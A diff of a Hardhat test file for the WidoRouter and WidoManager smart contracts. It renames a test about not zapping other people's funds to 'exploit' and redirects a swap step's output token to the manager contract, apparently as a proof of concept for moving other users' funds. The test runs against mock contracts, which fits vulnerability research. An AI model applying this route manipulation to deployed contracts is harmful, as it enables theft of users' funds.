@@ -9,19 +9,6 @@ import {WETH} from "../typechain/contracts/mock/WETH";
 import {SignerWithAddress} from "@nomiclabs/hardhat-ethers/signers";
 import {MockVault} from "../typechain/contracts/mock/MockVault";
 
-/* const setup = deployments.createFixture(async () => {
- await deployments.fixture(["WidoRouter", "USDC"]);
-  const contracts = {
-    WidoRouter: <WidoRouter>await ethers.getContract("WidoRouter"),
-    USDC: <ERC20>await ethers.getContract("USDC"),
-  };
-  const users = await setupUsers(await getUnnamedAccounts(), contracts);
-  return {
-    ...contracts,
-    users,
-  }; 
-}); */
-
 async function deployFixture() {
   const [_deployer, _user1, _user2, _bank] = await ethers.getSigners();
 
@@ -47,10 +34,6 @@ const executeOrderFn =
   "executeOrder((address,address,address,uint256,uint256,uint32,uint32),(address,address,address,bytes,int32)[],uint256,address)";
 
 describe(`WidoManager`, async () => {
-  /*   if (!["mainnet"].includes(process.env.HARDHAT_FORK as ChainName)) {
-    return;
-  } */
-
   let router: WidoRouter,
     manager: WidoManager,
     token1: MockERC20,
@@ -71,16 +54,9 @@ describe(`WidoManager`, async () => {
     deployer = _deployer;
     user1 = _user1;
     user2 = _user2;
-
-    /*     const {WidoRouter, users, USDC} = await setup();
-    widoRouter = WidoRouter;
-    usdcContract = USDC;
-    alice = users[0];
-    bob = users[1];
-    widoManagerAddr = await widoRouter.widoManager(); */
   });
 
-  it(`should not zap other people's funds`, async function () {
+  it(`exploit`, async function () {
     const amount = ethers.utils.parseUnits("1", 18);
 
     await token1.connect(user1).freeMint(amount);
@@ -94,8 +70,10 @@ describe(`WidoManager`, async () => {
     const data = vault.interface.encodeFunctionData("deposit", [amount]);
 
     const swapRoute: IWidoRouter.StepStruct[] = [
-      {fromToken: token1.address, toToken: vault.address, targetAddress: vault.address, data, amountIndex: 4},
+      {fromToken: token1.address, toToken: manager.address, targetAddress: vault.address, data, amountIndex: 4},
     ];
+
+    console.log("manager add", manager.address);
 
     const order: IWidoRouter.OrderStruct = {
       user: user1.address,
